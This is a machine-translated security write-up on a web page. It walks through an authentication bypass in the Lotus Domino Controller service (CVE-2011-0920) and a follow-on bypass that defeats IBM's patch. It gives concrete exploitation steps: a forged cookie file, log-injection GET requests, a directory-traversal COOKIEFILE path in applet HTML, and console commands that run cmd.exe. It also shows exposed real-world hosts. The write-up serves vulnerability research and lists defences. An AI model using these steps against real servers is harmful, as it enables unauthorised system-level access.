<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Lotus Domino penetration</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Exploiting Lotus Domino Controller service vulnerabilities 

 Recently, I often tell stories about how an ordinary pen test can detect 0-day vulnerabi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Lotus Domino penetration</h1><div class="post__text post__text-html js-mediator-article"><h4>  Exploiting Lotus Domino Controller service vulnerabilities </h4><br><br>  Recently, I often tell stories about how an ordinary pen test can detect 0-day vulnerability in popular software or develop a private exploit.  In fact, this kind of problem is solved with a pen test rarely and selectively, and this has its own reasons. <br><br>  And yet, I want to share a story (aha, bike) about how to solve just such problems, the pen-test goes beyond the monotonous scanning, brute-force and stuffing quotes into the parameters of a web application.  Namely, in this post you will learn about a simple bug in <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2011-0920">Lotus Domino Server Controller</a> , how a private exploit was created, and also found the problem of zero day, which is still relevant today. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/storage2/860/60a/8f7/86060a8f7b12c5e91717c4ddb4acedbc.jpg"><br><br><a name="habracut"></a><br><br><h5>  Penetration test </h5><br><br>  So, penetration test.  This topic is consistently annoyed every year on various blogs and various specialists.  And this is no accident: this service has many different subtleties and pitfalls.  But I will not stir up the water about the necessity, usefulness and content of this thing, I want to talk about the work itself.  About what makes the pen test exactly pen test. <br><br>  Any pen-tester solves many subtasks in order to accomplish the main task - the implementation of attacks on the components of an information system.  At the same time, I leave behind the brackets the detailed description and possible variations on the subject of the main task, since this is also not interesting now, but I will single out two or three subtasks that are ‚Äústate-of-art‚Äù: <br><br><ul><li>  Search (and confirm) vulnerabilities </li><li>  Exploit development </li><li>  Exploiting Vulnerability </li></ul><br><br>  It so happened that during one of the defaults a whole set of vulnerabilities was discovered without publicly available exploits, even without PoCs or detailed descriptions of the problem.  Therefore, for one such vulnerability, it was decided to find out everything ourselves and write a private exploit. <br><br><h5>  Authentication bypass in Lotus Domino Server Controller </h5><br><h6>  CVE-2011-0920 </h6><br><br>  This vulnerability was found by Patrick Karlsson and sold with giblets in <a href="http://www.zerodayinitiative.com/advisories/ZDI-11-110/">ZDI</a> .  So the description from the ZDI website is the only information that we have.  Short retelling: <br><br>  ‚ÄúVulnerability in the Domino Controller service, TCP port 2050. During the authentication process, an attacker can set the value of the COOKIEFILE parameter as a UNC path, thus establishing control over both the source file for basic authentication data and the values ‚Äã‚Äãentered during authentication.  This allows you to bypass the authentication verification mechanism and access the administration console.  Leads to code execution with SYSTEM privileges. ‚Äù <br><br>  The description, although not detailed, says enough about what is happening.  So, you can connect to the port number 2050, slip the COOKIEFILE parameter using a protocol, indicating the path type \\ ATTACKER_HOST \ FILE.  And in this file to place the username and password and, using the same username and password, enter the system.  It remains quite a bit - to disassemble the protocol and file format.  Using Nmap scans, you can determine that all the work is done over SSL, but the protocol for communication in the SSL wrapper remains to be seen.  In fact, this is extremely simple: it is enough to note that the Lotus Domino Controller service is completely written in Java, both the client and server parts, all in one file: <br><br> <code>C:\Program Files\IBM\Lotus\Domino\Data\domino\java\dconsole.jar</code> <br> <br>  This file is easy to decompile (for example, using <a href="http://members.fortunecity.com/neshkov/dj.html">DJ Java Decompiler</a> , although it is not as good as we would like).  After that we look for the code responsible for the connection and request processing.  Requests are processed in the NewClient class.  In this class, plaintext requests of the form are parsed: #COMMAND param1, param2, ... All commands are described separately: <br><br><pre> <code class="java hljs"> . . . <span class="hljs-comment"><span class="hljs-comment">//  ReadFromUser(); // s1 ‚Äì   2050/tcp if(s1.equals("#EXIT")) return 2; . . . if(s1.equals("#APPLET")) return 6; . . . if(s1.equals("#COOKIEFILE")) if(stringtokenizer.hasMoreTokens()) //     - // : #COOKIEFILE &lt;cookieFilename&gt; cookieFilename = stringtokenizer.nextToken().trim(); // return 7; . . . if(s1.equals("#UI")) if(stringtokenizer.hasMoreTokens()) // : #UI &lt;login&gt;,&lt;password&gt; usr = stringtokenizer.nextToken(",").trim(); //Login if(usr == null) return 4; if(stringtokenizer.hasMoreTokens()) // passwords pwd = stringtokenizer.nextToken().trim(); //Password return 0;</span></span></code> </pre><br><br>  So we met the parameter COOKIEFILE.  However, it alone is not enough.  Consider the main loop: <br><br><pre> <code class="java hljs"> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = ReadFromUser(); <span class="hljs-comment"><span class="hljs-comment">//Point.1 if(i == 2) break; //if #EXIT . . . if(i == 6) //if #APPLET Point.2 { appletConnection = true; continue; } . . . //     admindata.xml . . . if(userinfo == null) //Point.9 { //     admindata.xml WriteToUser("NOT_REG_ADMIN"); continue; } . . . if(!appletConnection) //Point.3 flag = vrfyPwd.verifyUserPassword(pwd, userinfo.userPWD()) else flag = verifyAppletUserCookie(usr, pwd); // if #APPLET . . . if(flag) WriteToUser("VALID_USER"); else WriteToUser("WRONG_PASSWORD"); } while(true); if(flag) { //  . . . }else { // }</span></span></code> </pre><br><br>  As you can see, we have TWO authentication options (Point.3).  The first is ordinary, by login and password, and the second is also by login and password, but using COOKIEFILE.  In this case, the second option is selected only if before this was the #APPLET (Point.2) command.  All commands are read in turn in a loop (Point.1).  Therefore, #COOKIEFILE alone is not enough. <br><br>  Now we understand the format of the protocol, what is the format of the file itself?  Consider the verifyAppletUserCookie function: <br><br><pre> <code class="java hljs">File file = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(cookieFilename); <span class="hljs-comment"><span class="hljs-comment">//Point.4 . . . inputstreamreader = new InputStreamReader(new FileInputStream(file), "UTF8"); . . . inputstreamreader.read(ac, 0, i); //Point.5 . . . String s7 = new String(ac); . . . do { if((j = s7.indexOf("&lt;user ", j)) &lt;= 0) //Point.6 break; int k = s7.indexOf("&gt;", j); if(k == -1) break; String s2 = getStringToken(s7, "name=\"", "\"", j, k); //Point.7 . . . String s3 = getStringToken(s7, "cookie=\"", "\"", j, k); . . . String s4 = getStringToken(s7, "address=\"", "\"", j, k); . . . //Point.8 if(usr.equalsIgnoreCase(s2) &amp;&amp; pwd.equalsIgnoreCase(s3) &amp;&amp;\ appletUserAddress.equalsIgnoreCase(s4)) { flag = true; break; } . . . } while(true);</span></span></code> </pre><br><br>  It can be seen that the line commented as Point.4 opens a file whose name is specified by the user (the variable was initialized in the ReadFromUser () function when parsing the #COOKIEFILE command).  And the input is not filtered in any way, there may be at least a UNC path.  Next, the file is read into the string s7 (Point.5).  Further, this line is processed in a loop, where it is clear that this is an ordinary XML file of the form: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äùusr‚Äù</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">cookie</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äùpass‚Äù</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">address</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äùvalue‚Äù</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  After that, the line commented as Point.8 compares the input of the login, password and address value (#ADDRESS) with the corresponding attribute values ‚Äã‚Äãof the tag.  Since this file can be read from a remote host (on a slipped UNC path), the attack becomes simple and obvious. <br><br>  This is how exploitation of the vulnerability for ZDI-11-110 looks like. <br><br>  1. Create a file (cookie.xml): <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"admin"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">cookie</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"dsecrg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">address</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"10.10.0.1"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  2. We use ncat <br><br><img src="https://habrastorage.org/storage2/643/ba3/a77/643ba3a77e447fe7234ee677dbe06424.png"><br><br>  The ‚Äú#APPLET‚Äù command tells the server that we want to use a cookie for authentication.  Now, when we try to authenticate using the ‚Äú#UI‚Äù command, the server will try to open the file along the path we gave it using ‚Äú#COOKIEFILE‚Äù.  After that, from there he will take the authentication data and compare it with those entered after the #UI command.  After the ‚Äú#EXIT‚Äù command, the server will start the input processing process for the authenticated user, and you can already manage the service, as well as execute OS commands! <br><br>  It would seem that the tale is over.  Moreover, IBM made a fix for this problem, and not even one!  These innovations have appeared since version 8.5.2FP3 and 8.5.3. <br><br><h4>  Correction 1. </h4><br><br><img src="https://habrastorage.org/storage2/0a7/44c/55a/0a744c55a37ef55dbe97756ddbe245f4.png"><br><br>  Now you need the correct client certificate to connect to port 2050.  That is, Ncat and Nmap no longer work with port 2050. <br><br><h4>  Correction 2. </h4><br><br><img src="https://habrastorage.org/storage2/605/144/9e6/6051449e6747f219848c433b1985b564.png"><br><br>  Now, ‚Äú. \‚Äù Is added before the file name, which means that we can no longer use UNC.  Vulnerability fixed.  The patch seems adequate. <br><br>  In fact, it is not.  Take a look at the lines of code again (commented as Point.6 and Point.7).  The getStringToken function is actually a substring.  Hence the obvious question: why did programmers, when implementing this module, resort to writing their own XML parser?  Obviously, this parser works with any file that has the corresponding lines: ‚Äú&lt;user‚Äù, ‚Äúname =‚Äù, etc.  In other words, this is what we expect: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"usr"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">cookie</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"psw"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">address</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"dsecrg"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  But here's what you can slip, and it‚Äôs just as well parted: <br><br><pre> <code class="xml hljs">trashtrash<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">sdsdasdsdname</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äùusr‚Äùsadasd</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">asdnkasdk</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">cookie</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äùpsw‚Äùsssssaddress</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äùdsecrg‚Äùbf</span></span></span><span class="hljs-tag"> %&gt;</span></span></code> </pre> <br><br>  What does it mean?  Apparently, we found another vulnerability in the same section of the code.  Namely, that together with the ability to connect a local file (UNC can not, but the traversal directory is still as we can: #COOKIEFILE .. \ .. \ .. \ .. \ file -&gt; <b>. \</b> .. \ .. \ .. \ file), you can inject authentication data into any writable files. <br><br>  For example: <br><br>  1. Injectable cookievalues ‚Äã‚Äãusing the Microsoft HTTPAPI service (thanks to <a href="https://habrahabr.ru/users/jug/" class="user_link">jug</a> for finding this log file on the combat, enemy server at the right moment): <br><br><pre> <code class="hljs pgsql">C:\&gt; ncat targethost <span class="hljs-number"><span class="hljs-number">49152</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /&lt;<span class="hljs-keyword"><span class="hljs-keyword">user</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> C:\&gt; ncat targethost <span class="hljs-number"><span class="hljs-number">49152</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-keyword"><span class="hljs-keyword">user</span></span>="admin"cookie="pass"address="http://twitter/asintsov" HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span></code> </pre><br><br>  Here \ r \ n is just Enter! <br><br>  2. Now the log file on the server will be like this: <br><br><pre> <code class="hljs vbscript">#Software: Microsoft HTTP API <span class="hljs-number"><span class="hljs-number">2.0</span></span> #Version: <span class="hljs-number"><span class="hljs-number">1.0</span></span> #<span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: <span class="hljs-number"><span class="hljs-number">2011</span></span><span class="hljs-number"><span class="hljs-number">-08</span></span><span class="hljs-number"><span class="hljs-number">-22</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">19</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> #Fields: <span class="hljs-built_in"><span class="hljs-built_in">date</span></span> <span class="hljs-built_in"><span class="hljs-built_in">time</span></span> c-ip c-port s-ip s-port cs-version cs-method cs-uri sc-status s-siteid s-reason s-queuename <span class="hljs-number"><span class="hljs-number">2011</span></span><span class="hljs-number"><span class="hljs-number">-08</span></span><span class="hljs-number"><span class="hljs-number">-22</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">19</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.10</span></span><span class="hljs-number"><span class="hljs-number">.101</span></span> <span class="hljs-number"><span class="hljs-number">46130</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span> <span class="hljs-number"><span class="hljs-number">47001</span></span> - - - <span class="hljs-number"><span class="hljs-number">400</span></span> - BadRequest - <span class="hljs-number"><span class="hljs-number">2011</span></span><span class="hljs-number"><span class="hljs-number">-08</span></span><span class="hljs-number"><span class="hljs-number">-22</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">19</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.10</span></span><span class="hljs-number"><span class="hljs-number">.101</span></span> <span class="hljs-number"><span class="hljs-number">46234</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span> <span class="hljs-number"><span class="hljs-number">47001</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / <span class="hljs-number"><span class="hljs-number">404</span></span> - NotFound - <span class="hljs-number"><span class="hljs-number">2011</span></span><span class="hljs-number"><span class="hljs-number">-08</span></span><span class="hljs-number"><span class="hljs-number">-26</span></span> <span class="hljs-number"><span class="hljs-number">11</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span>:<span class="hljs-number"><span class="hljs-number">30</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.10</span></span><span class="hljs-number"><span class="hljs-number">.101</span></span> <span class="hljs-number"><span class="hljs-number">52902</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span> <span class="hljs-number"><span class="hljs-number">47001</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> &lt;user <span class="hljs-number"><span class="hljs-number">404</span></span> - NotFound - <span class="hljs-number"><span class="hljs-number">2011</span></span><span class="hljs-number"><span class="hljs-number">-08</span></span><span class="hljs-number"><span class="hljs-number">-26</span></span> <span class="hljs-number"><span class="hljs-number">11</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span>:<span class="hljs-number"><span class="hljs-number">30</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.10</span></span><span class="hljs-number"><span class="hljs-number">.101</span></span> <span class="hljs-number"><span class="hljs-number">52905</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span> <span class="hljs-number"><span class="hljs-number">47001</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> name=<span class="hljs-string"><span class="hljs-string">"admin"</span></span>cookie=<span class="hljs-string"><span class="hljs-string">"pass"</span></span>address=<span class="hljs-string"><span class="hljs-string">"http://twitter/asintsov"</span></span>&gt; <span class="hljs-number"><span class="hljs-number">404</span></span> - NotFound - <span class="hljs-number"><span class="hljs-number">2011</span></span><span class="hljs-number"><span class="hljs-number">-08</span></span><span class="hljs-number"><span class="hljs-number">-22</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">19</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.10</span></span><span class="hljs-number"><span class="hljs-number">.101</span></span> <span class="hljs-number"><span class="hljs-number">46130</span></span> <span class="hljs-number"><span class="hljs-number">10.10</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span><span class="hljs-number"><span class="hljs-number">.9</span></span> <span class="hljs-number"><span class="hljs-number">47001</span></span> - - - <span class="hljs-number"><span class="hljs-number">400</span></span> - BadRequest -</code> </pre><br><br>  Two requests were not made by chance, since the IBM parser will look for the string ‚Äú&lt;user‚Äù with a space at the end!  And all spaces in the request are encoded as ‚Äú% 20‚Äù, and therefore it does not suit us.  Then we make the first request so that after the ‚Äú&lt;user‚Äù the space is set by the web server itself (between the request and the result ‚Äú404 - NotFound‚Äù).  With the second query, we finish everything else. <br><br>  Great, almost everything is ready, it remains only to learn how to connect to 2050, because we do not have an SSL certificate.  Or is there?  Remembering that dconsole.jar is also responsible for the client part, as an applet, it is obvious that there must be a certificate - and there it is.  And the key is there.  Everything is there.  In principle, you can pull out the key and write an exploit, but if it's too lazy, you can use this applet directly: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">applet</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"DominoConsole"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">code</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"lotus.domino.console.DominoConsoleApplet.class"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">codebase</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://127.0.0.1/domjava/"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">archive</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"dconsole.jar"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag"> = </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"99%‚Äú&gt; &lt;PARAM NAME="</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">debug</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PARAM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"port"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"2050"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PARAM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"useraddress"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://twitter/asintsov"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PARAM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"username"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"admin"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PARAM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"cookiefile"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"\..\..\..\windows\system32\logfiles\httperr\httperr1.log"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PARAM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"cookievalue"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pass"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PARAM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"onLoad"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">VALUE</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"onLoadConsole"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">applet</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  We load this applet in any browser, add a redirect from the local port 2050 to the remote one, and that's it - the effect is achieved.  Video Example: <iframe width="560" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/EsJx5s9J3a4%3Ffeature%3Doembed&amp;xid=17259,15700021,15700186,15700190,15700253,15700256,15700259&amp;usg=ALkJrhh_ba9eEmoI-HixoO0_Htajl5BhdQ" frameborder="0" allowfullscreen=""></iframe><br><br>  Execute commands from the console.  Option 1: <br><br> <code>LOAD cmd.exe /c command</code> <br> <br>  Execute commands from the console.  Option 2: <br><br> <code>$ command</code> <br> <br><h6>  Protection: </h6><br><ul><li>  Port 2050 actually needs to be filtered. </li><li>  Prohibit dangerous commands in the console by setting an additional password to the console (it will protect you from executing commands from the console in the first version) </li><li>  Check the file admindata.xml.  For each user, you need to check the privileges.  Values ‚Äã‚Äã4, 25 or 26 indicate that this user has the rights to execute system commands!  Removing them, we will protect ourselves from executing commands from the console in the second version. </li></ul><br><br><h6>  Note: </h6><br>  The attacker, in all the listed options, needs to know the correct login value in order to successfully bypass authentication.  In any case, it can be iterated, since in the case of a nonexistent login, the error NOT_REG_ADMIN is issued, and if the password is incorrect, then WRONG_PASSWORD (Point.9). <br><br><h4>  PS Internet Attack </h4><br><br>  Subnet Moscow University: <br><br><img src="https://habrastorage.org/storage2/82e/3e2/a22/82e3e2a22a650a9438cd0c2665ee1c58.png"><br><br>  Domain .gov, or American scientists do not like firewalls: <br><br><img src="https://habrastorage.org/storage2/4bd/2b7/262/4bd2b7262fb988eae6a37ef827c2ed04.png"><br><br>  Even IBM itself cannot filter port 2050 and update Lotus (+ demonstration of ‚Äúlogin‚Äù guessing): <br><br><img src="https://habrastorage.org/storage2/4a6/e0f/f80/4a6e0ff8039c4f988a1b9d88f5fc1a82.png"><br><br><h4>  findings </h4><br><ul><li>  Patches do not always solve the problem to the end. </li><li>  Firewall is the best protection. </li><li>  Do not ignore the built-in security settings. </li></ul><br><br>  ... and even then 0day vulnerabilities are not terrible. </div><p>Source: <a href="https://habr.com/ru/post/141275/">https://habr.com/ru/post/141275/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
